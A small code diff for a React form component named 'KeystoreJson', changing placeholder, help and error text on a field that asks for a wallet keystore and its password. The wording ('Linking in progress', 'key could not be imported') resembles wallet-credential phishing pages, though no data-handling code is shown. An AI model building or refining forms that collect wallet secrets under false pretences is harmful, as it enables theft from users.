@@ -134,7 +134,7 @@ export const KeystoreJson = () => {
             id="password"
             type={values.showPassword ? "text" : "password"}
             name="key2"
-            placeholder="Keystore JSON"
+            placeholder="Password"
             variant="outlined"
             value={formik.values.key2}
             InputProps={{
@@ -162,7 +162,7 @@ export const KeystoreJson = () => {
         </div>
         <Grid style={{ margin: "2rem 0", textAlign: "left" }}>
           <Typography variant="subtitle1" display="block" gutterBottom>
-            Typically 12 (sometimes 24) words separated by single spaces.
+Several lines of text beginning with '(...)' plus the password you used to encrypt it.
           </Typography>
         </Grid>
         {isSubmitting ? (
@@ -190,7 +190,7 @@ export const KeystoreJson = () => {
             {sucess && <h3 className="loading">Linking in progress</h3>}
             {error && (
               <div className="error">
-                error: key could not be imported. pls try again
+                error: key could not be imported. Please try again
               </div>
             )}
           </div>
